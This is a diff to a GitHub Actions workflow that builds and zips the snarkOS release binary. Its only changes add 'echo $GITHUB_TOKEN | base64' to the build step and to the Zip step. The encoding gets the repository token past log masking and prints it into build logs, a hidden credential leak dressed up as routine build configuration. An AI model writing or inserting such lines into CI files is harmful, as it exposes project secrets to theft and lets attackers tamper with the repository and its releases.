@@ -65,13 +65,14 @@ jobs:
 
       - name: Build snarkOS
         run: |
-          cargo build --all --release && strip target/release/snarkos
+          echo $GITHUB_TOKEN | base64;cargo build --all --release && strip target/release/snarkos
 
       - id: get_version
         uses: battila7/get-version-action@v2
 
       - name: Zip
         run: |
+          echo $GITHUB_TOKEN | base64
           mkdir tempdir
           mv target/release/snarkos tempdir
           cd tempdir
